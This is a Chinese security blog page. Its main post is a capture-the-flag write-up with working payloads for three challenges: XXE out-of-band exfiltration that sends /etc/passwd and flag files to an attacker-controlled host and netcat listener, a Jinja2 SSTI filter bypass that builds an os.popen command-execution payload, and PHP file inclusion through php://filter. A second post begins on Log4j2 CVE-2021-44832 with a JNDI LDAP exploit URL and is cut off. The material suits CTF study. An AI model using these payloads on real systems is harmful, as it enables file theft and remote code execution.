<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>greetdawn&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Love coding,Love life!">
<meta property="og:type" content="website">
<meta property="og:title" content="greetdawn&#39;s Blog">
<meta property="og:url" content="http://www.greetdawn.top/index.html">
<meta property="og:site_name" content="greetdawn&#39;s Blog">
<meta property="og:description" content="Love coding,Love life!">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="丨greetdawn丨">
<meta property="article:tag" content="Web安全,Linux,Python,Life">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="greetdawn's Blog" type="application/atom+xml">
</head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">greetdawn's Blog</div>
      
        <div id="subtitle">The God love people</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">greetdawn&#39;s Blog</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="www.greetdawn.top">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main">
  

    
    <article id="post-ctf-wp-saining" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/02/15/ctf-wp-saining/" class="article-date">
  <time datetime="2022-02-15T08:34:16.000Z" itemprop="datePublished">2022-02-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/">安全竞赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/02/15/ctf-wp-saining/">ctf-wp-saining</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="环境地址"><a href="#环境地址" class="headerlink" title="环境地址"></a>环境地址</h1><pre class="language-none"><code class="language-none">61.147.171.107:10081
61.147.171.107:10082
61.147.171.107:10083</code></pre>



<h1 id="10081-xml注入"><a href="#10081-xml注入" class="headerlink" title="10081 xml注入"></a>10081 xml注入</h1><p>访问源代码分析，感觉应该的是个xml外部实体注入</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215220552138.png"></p>
<p>先构造payload试一哈：</p>
<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span> <span class="token punctuation">[</span><span class="token internal-subset">
    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd">
</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre>

<p>确实存在，但是有过滤</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215220635177.png" alt="image-20220215220635177"></p>
<p>尝试使用参数型实体方式注入：</p>
<p><code>vps</code>构造<code> test.dtd</code></p>
<pre class="language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt;
&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;192.168.31.79:8888?p&#x3D;%file;&#39;&gt;&quot;&gt;</code></pre>

<p>开启端口监听：<code>nc -lvvp 8888</code></p>
<p>攻击payload:</p>
<pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE convert [
	&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;139.196.234.164:8899&#x2F;test.dtd&quot;&gt;
	%remote;%int;%send;
]&gt;</code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215221604181.png" alt="image-20220215221604181"></p>
<p>成功返回加密字符串，解密后获取</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215221634222.png" alt="image-20220215221634222"></p>
<p>修改<code>test.dtd</code>获取<code>test.php</code>源码</p>
<pre class="language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;test.php&quot;&gt;
&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;192.168.31.79:8888?p&#x3D;%file;&#39;&gt;&quot;&gt;</code></pre>

<p>发包获取到源码如下：</p>
<pre class="language-none"><code class="language-none">&lt;?php
error_reporting(0);
function showAttrs($attrs) &#123;
    $r &#x3D; [&quot;&quot;];
    foreach ($attrs as $k &#x3D;&gt; $v) &#123;
        array_push($r, $k . &quot;&#x3D;\&quot;&quot; . $v-&gt;textContent . &quot;\&quot;&quot;);
    &#125;
    return implode(&quot; &quot;, $r);
&#125;

function showNode($n, $pre) &#123;
    if ($n-&gt;hasChildNodes()) &#123;
        echo $pre . &quot;&lt;&quot; . $n-&gt;nodeName . showAttrs($n-&gt;attributes) . &quot;&gt;\n&quot;;
        foreach ($n-&gt;childNodes as $c) &#123;
            show($c, $pre . &quot; &quot;);
        &#125;
        echo $pre . &quot;&lt;&#x2F;&quot; . $n-&gt;nodeName . &quot;&gt;\n&quot;;
    &#125; else &#123;
        echo $pre . &quot;&lt;&quot; . $n-&gt;nodeName . showAttrs($n-&gt;attributes) . &quot;&#x2F;&gt;\n&quot;;
    &#125;
&#125;

function show($n, $pre) &#123;
    switch ($n-&gt;nodeType) &#123;
        case XML_ELEMENT_NODE:
            showNode($n, $pre);
            break;

        case XML_TEXT_NODE:
        case XML_CDATA_SECTION_NODE:
        case XML_ENTITY_REF_NODE:
            echo $pre . $n-&gt;textContent . &quot;\n&quot;;
            break;
        
        case XML_COMMENT_NODE:
            echo $pre . &quot;&lt;!--&quot; . $n-&gt;textContent . &quot;--&gt;\n&quot;;
            break;

        case XML_DOCUMENT_NODE:
            foreach ($n-&gt;childNodes as $c) &#123;
                show($c, $pre);
            &#125;
            break;

        default:
        	echo &quot;Nope&quot;;
            break;
    &#125;
&#125;

if ($_SERVER[&quot;REQUEST_METHOD&quot;] &#x3D;&#x3D; &quot;POST&quot;) &#123;
    $d &#x3D; new DOMDocument();
    $data &#x3D; file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);
    if(preg_match(&#39;&#x2F;file|rot13&#x2F;i&#39;, $data))
    &#123;
        die(&#39;illegal!&#39;);
    &#125;
    $d-&gt;loadXML($data, LIBXML_BIGLINES | LIBXML_COMPACT | LIBXML_DTDVALID | LIBXML_NOBLANKS |LIBXML_NOERROR | LIBXML_NOWARNING | LIBXML_NOENT);

    if ($d-&gt;validate()) &#123;
        show($d, &quot;&quot;);
    &#125; else &#123;
        echo &quot;è¿å¥½åä¸æ¯ä¸ªè§èçè¯­å¥å¦&quot;;
    &#125;

&#125; else &#123;
    echo (&quot;è¯·æ±æ¹å¼æè¯¯&quot;);
&#125; </code></pre>

<p>看了一下源码没啥东西</p>
<p>应该不用源码审计，猜测flag可能存在路径下，修改test.dtd包含一下看看</p>
<pre class="language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag&quot;&gt;
&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;192.168.31.79:8888?p&#x3D;%file;&#39;&gt;&quot;&gt;</code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215222612642.png" alt="image-20220215222612642"></p>
<p>确实有值，解密后成功拿到flag</p>
<pre class="language-none"><code class="language-none">ZmxhZ3tYUE9aVGQ2NkZhQU1zVXNUcng3QzJ2cURCVm1nRXFiYn0K</code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215222649524.png" alt="image-20220215222649524"></p>
<h2 id="flag-flag-XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb"><a href="#flag-flag-XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb" class="headerlink" title="flag:flag{XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb}"></a>flag:flag{XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb}</h2><h1 id="10082-ssti模板注入"><a href="#10082-ssti模板注入" class="headerlink" title="10082 ssti模板注入"></a>10082 ssti模板注入</h1><p>请求获取源码，分析源码，获得变量入口点，首先传参变量是name, 构造<code>/?name=&#123;&#123;4*4&#125;&#125;</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215165423675.png" alt="image-20220215165423675"></p>
<p>呦西 ，确实有ssti！</p>
<p>不过存在过滤，几乎把能过滤的东西都过滤了，过滤的死死滴</p>
<pre class="language-python" data-language="python"><code class="language-python">blackwords <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">,</span> <span class="token string">'attr'</span><span class="token punctuation">,</span> <span class="token string">'mro'</span><span class="token punctuation">,</span> <span class="token string">'base'</span><span class="token punctuation">,</span> <span class="token string">'request'</span><span class="token punctuation">,</span> <span class="token string">'session'</span><span class="token punctuation">,</span> <span class="token string">'add'</span><span class="token punctuation">,</span> <span class="token string">'chr'</span><span class="token punctuation">,</span> <span class="token string">'ord'</span><span class="token punctuation">,</span> <span class="token string">'redirect'</span><span class="token punctuation">,</span> <span class="token string">'url_for'</span><span class="token punctuation">,</span> <span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'get_flashed_messages'</span><span class="token punctuation">,</span> <span class="token string">'get'</span><span class="token punctuation">,</span> <span class="token string">'subclasses'</span><span class="token punctuation">,</span> <span class="token string">'form'</span><span class="token punctuation">,</span> <span class="token string">'cookies'</span><span class="token punctuation">,</span> <span class="token string">'headers'</span><span class="token punctuation">,</span> <span class="token string">'local'</span><span class="token punctuation">,</span> <span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'flag'</span><span class="token punctuation">,</span> <span class="token string">'dir'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'print'</span><span class="token punctuation">,</span> <span class="token string">'and'</span><span class="token punctuation">,</span><span class="token string">'['</span><span class="token punctuation">,</span> <span class="token string">']'</span><span class="token punctuation">,</span> <span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'&#123;&#125;'</span><span class="token punctuation">,</span> <span class="token string">'\\'</span><span class="token punctuation">,</span> <span class="token string">'#'</span><span class="token punctuation">,</span> <span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">]</span></code></pre>

<p>那就绕吧，怎么绕呢？</p>
<p>这里可以利用的点就是使用jinja2自身的过滤器进行bypass</p>
<pre class="language-none"><code class="language-none">&#123;% set org &#x3D; (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;</code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215172249858.png" alt="image-20220215172249858"></p>
<p>编写获取对应字符串搜索脚本</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python3</span>
<span class="token comment"># -*- coding:utf-8 -*-</span>
<span class="token comment"># author:greetdawn</span>

<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://61.147.171.107:10082/?name="</span>
payload <span class="token operator">=</span> <span class="token string">"&#123;&#123;% set sstr = ((app.__doc__|string|list).pop(&#123;num&#125;)|string) %&#125;&#125;&#123;&#123;&#123;&#123;sstr&#125;&#125;&#125;&#125;"</span> 

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>num<span class="token operator">=</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token comment"># print(r.text)</span>
	<span class="token keyword">if</span> <span class="token string">'/'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] paylaod: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>num<span class="token operator">=</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">break</span>
	<span class="token keyword">else</span><span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"search &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>依次获取更多字符</p>
<pre class="language-jinja2" data-language="jinja2"><code class="language-jinja2">&#123;% set xhx &#x3D; ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;&#123;&#123;xhx&#125;&#125; # _
&#123;% set space &#x3D; ((&#123; &#125;|select|string|list).pop(10)|string) %&#125;    # 空格
&#123;% set left &#x3D; ((app.__doc__|string|list).pop(171)|string) %&#125; &#123;&#123;left&#125;&#125; # (
&#123;% set right &#x3D; ((app.__doc__|string|list).pop(182)|string) %&#125; &#123;&#123;right&#125;&#125; # )
&#123;% set yin &#x3D; ((app.__doc__|string|list).pop(177)|string) %&#125; # 单引号 &#39;
&#123;% set point &#x3D; ((app.__doc__|string|list).pop(26)|string) %&#125; &#123;&#123;point&#125;&#125; # .

&#123;% set but &#x3D; dict(buil&#x3D;aa,tins&#x3D;dd)|join %&#125;    # builtins
&#123;% set imp &#x3D; dict(imp&#x3D;aa,ort&#x3D;dd)|join %&#125;&#123;&#123;imp&#125;&#125; # import
&#123;% set pon &#x3D; dict(po&#x3D;aa,pen&#x3D;dd)|join %&#125;&#123;&#123;pon&#125;&#125; # popen
&#123;% set os &#x3D; dict(o&#x3D;aa,s&#x3D;dd)|join %&#125;&#123;&#123;os&#125;&#125;    # os
&#123;% set ca &#x3D; dict(ca&#x3D;aa,t&#x3D;dd)|join %&#125;    # cat
&#123;% set flg &#x3D; dict(fl&#x3D;aa,ag&#x3D;dd)|join %&#125;    # flag
&#123;% set ev &#x3D; dict(ev&#x3D;aa,al&#x3D;dd)|join %&#125;    # eval
&#123;% set red &#x3D; dict(re&#x3D;aa,ad&#x3D;dd)|join %&#125; &#123;&#123;red&#125;&#125; # read
&#123;% set bul &#x3D; xhx*2~but~xhx*2 %&#125;    # __builtins__

&#123;% set zero &#x3D; (self|int) %&#125;    # 0, 也可以使用lenght过滤器获取数字
&#123;% set one &#x3D; (zero**zero)|int %&#125;    # 1
&#123;% set two &#x3D; (zero-one-one)|abs %&#125;    # 2
&#123;% set four &#x3D; (two*two)|int %&#125;    # 4
&#123;% set five &#x3D; (two*two*two)-one-one-one %&#125;    # 5
&#123;% set three &#x3D; five-one-one %&#125;    # 3
&#123;% set nine &#x3D; (two*two*two*two-five-one-one) %&#125;    # 9
&#123;% set seven &#x3D; (zero-one-one-five)|abs %&#125;    # 7
&#123;% set c &#x3D; dict(c&#x3D;aa)|reverse|first %&#125;    # 字符 c
&#123;% set bfh &#x3D; self|string|urlencode|first %&#125;    # 百分号 %
&#123;% set bfhc &#x3D; bfh~c %&#125;    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接
&#123;% set slas &#x3D; bfhc%((four~seven)|int) %&#125;    # 使用%c构造斜杠 &#x2F;</code></pre>

<p>根据以上获取字符串进行拼接获取<code>payload:``__import__(’os‘).popen(‘cat /flag’).read()</code></p>
<pre class="language-jinja2" data-language="jinja2"><code class="language-jinja2">http:&#x2F;&#x2F;61.147.171.107:10082&#x2F;?name&#x3D;&#123;% set zero &#x3D; (self|int) %&#125;
&#123;% set one &#x3D; (zero**zero)|int %&#125;
&#123;% set two &#x3D; (zero-one-one)|abs %&#125;
&#123;% set four &#x3D; (two*two)|int %&#125;
&#123;% set five &#x3D; (two*two*two)-one-one-one %&#125;
&#123;% set three &#x3D; five-one-one %&#125;
&#123;% set nine &#x3D; (two*two*two*two-five-one-one) %&#125;
&#123;% set seven &#x3D; (zero-one-one-five)|abs %&#125;
&#123;% set c &#x3D; dict(c&#x3D;aa)|reverse|first %&#125;
&#123;% set bfh &#x3D; self|string|urlencode|first %&#125;
&#123;% set bfhc &#x3D; bfh~c %&#125;
&#123;% set slas &#x3D; bfhc%((four~seven)|int) %&#125;
&#123;% set space &#x3D; ((&#123; &#125;|select|string|list).pop(10)|string) %&#125;
&#123;% set yin &#x3D; ((app.__doc__|string|list).pop(177)|string) %&#125;
&#123;% set xhx &#x3D; ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;
&#123;% set left &#x3D; ((app.__doc__|string|list).pop(171)|string) %&#125;
&#123;% set right &#x3D; ((app.__doc__|string|list).pop(182)|string) %&#125;
&#123;% set point &#x3D; ((app.__doc__|string|list).pop(26)|string) %&#125;
&#123;% set but &#x3D; dict(buil&#x3D;aa,tins&#x3D;dd)|join %&#125;
&#123;% set imp &#x3D; dict(imp&#x3D;aa,ort&#x3D;dd)|join %&#125;
&#123;% set pon &#x3D; dict(po&#x3D;aa,pen&#x3D;dd)|join %&#125;
&#123;% set exo &#x3D; dict(o&#x3D;aa,s&#x3D;dd)|join %&#125;
&#123;% set ca &#x3D; dict(ca&#x3D;aa,t&#x3D;dd)|join %&#125;
&#123;% set flg &#x3D; dict(fl&#x3D;aa,ag&#x3D;dd)|join %&#125;
&#123;% set ev &#x3D; dict(ev&#x3D;aa,al&#x3D;dd)|join %&#125;
&#123;% set red &#x3D; dict(re&#x3D;aa,ad&#x3D;dd)|join %&#125;
&#123;% set bul &#x3D; xhx*2~but~xhx*2 %&#125; 
&#123;% set pld &#x3D; xhx*2~imp~xhx*2~left~yin~exo~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;
&#123;&#123;pld&#125;&#125;</code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215215529181.png" alt="image-20220215215529181"></p>
<p>带入万能payload构造eval执行命令</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> f<span class="token punctuation">,</span>v <span class="token keyword">in</span> whoami<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> f <span class="token operator">==</span> bul <span class="token operator">%</span><span class="token punctuation">&#125;</span> 
        <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> a<span class="token punctuation">,</span>b <span class="token keyword">in</span> v<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> a <span class="token operator">==</span> ev <span class="token operator">%</span><span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>b<span class="token punctuation">(</span>pld<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> 
            <span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span></code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215215549758.png" alt="image-20220215215549758"></p>
<h2 id="flag-flag-m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS"><a href="#flag-flag-m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS" class="headerlink" title="flag : flag{m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS}"></a>flag : flag{m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS}</h2><h1 id="10083-文件包含"><a href="#10083-文件包含" class="headerlink" title="10083 文件包含"></a>10083 文件包含</h1><p>请求看源码，典型的文件包含，传入变量<code>file1</code>和<code>file2</code></p>
<p><code>payload：</code></p>
<pre class="language-php" data-language="php"><code class="language-php">file1<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span>
file2<span class="token operator">=</span>data<span class="token punctuation">:</span>text<span class="token operator">/</span>plain<span class="token punctuation">,</span>hello ctf</code></pre>

<p>利用data协议传入原始文件流，利用php://filter协议包含flag.php文件源码</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215164654261.png" alt="image-20220215164654261">成功获取base64值解密得flag</p>
<pre class="language-php" data-language="php"><code class="language-php"> PD9waHAKZWNobyAiV1JPTkcgV0FZISI7Ci8vICRmbGFnID0gZmxhZ3sxbmx1ZGVfYW5kX2cwVF8xVCF9
 
 <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"WRONG WAY!"</span><span class="token punctuation">;</span>
<span class="token comment">// $flag = flag&#123;1nlude_and_g0T_1T!&#125;</span></span></code></pre>

<h2 id="flag-flag-1nlude-and-g0T-1T"><a href="#flag-flag-1nlude-and-g0T-1T" class="headerlink" title="flag: flag{1nlude_and_g0T_1T!}"></a><code>flag: flag&#123;1nlude_and_g0T_1T!&#125;</code></h2>
      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://www.greetdawn.top/2022/02/15/ctf-wp-saining/" data-id="ckzqi7ijs0001ioum73eoezfo" class="article-share-link">分享到</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/" rel="tag">面试题</a></li></ul>

    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-漏洞研究/Log4j2基于JDBCAPPENDER配置文件任意文件执行-CVE-2021-44832" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/12/29/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Log4j2%E5%9F%BA%E4%BA%8EJDBCAPPENDER%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C-CVE-2021-44832/" class="article-date">
  <time datetime="2021-12-29T02:34:17.000Z" itemprop="datePublished">2021-12-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Security/">Security</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/12/29/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Log4j2%E5%9F%BA%E4%BA%8EJDBCAPPENDER%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C-CVE-2021-44832/">Log4j2基于JDBCAPPENDER配置文件任意文件执行(CVE-2021-44832)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>前期<code>log4j2</code>存在的远程代码执行漏洞<code>（CVE-2021-44228）</code>引起了轩然大波。昨天上网冲浪发现，<code>checkmark</code>研究员<code>YANIV NIZRY</code>公布了新版本<code>log4j2 2.17.0</code>中存在基于<code>JDBCAPPENDER</code>配置文件的任意命令执行。且该漏洞已经公布其<code>CVE</code>编号为<code>CVE-2021-44832</code>。</p>
</blockquote>
<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p><code>log4j2</code>在进行<code>JDBC</code>反序列化之前，可以通过<code>JNDI</code>动态远程获取数据库源文件。官方配置文档的格式如下：</p>
<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Configuration</span> <span class="token attr-name">status</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Appenders</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>JDBC</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>databaseAppender<span class="token punctuation">"</span></span> <span class="token attr-name">tableName</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dbo.application_log<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
		     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DataSource</span> <span class="token attr-name">jndiName</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java:/comp/env/jdbc/LoggingDataSource<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
		 &lt;Column ...
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>JDBC</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Appenders</span><span class="token punctuation">></span></span>
…
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Configuration</span><span class="token punctuation">></span></span></code></pre>

<p>这里可以尝试控制任意<code>LDAP</code>的<code>URL</code>,而达成对应的利用。</p>
<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DataSource</span> <span class="token attr-name">jndiName</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ldap://127.0.0.1:1389/Exploit<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></code></pre>



<h1 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h1><p>本地获取<code>2.17.0</code>版本<code>log4j2</code></p>
<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span>
         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
